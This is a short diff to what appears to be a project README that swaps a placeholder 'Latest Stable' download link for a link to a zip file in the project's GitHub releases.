@@ -10,4 +10,4 @@ It's lightweight and runs as a PWA too!
 
 ## Downloads:
 
-<a href="myFile.js" download>Latest Stable</a>
+<a href="https://github.com/More-to-Explore/source/releases/download/untagged-adc3462dfaf02a5e307e/MoreToExplore.unzip.the.package.zip" download>Latest Stable</a>
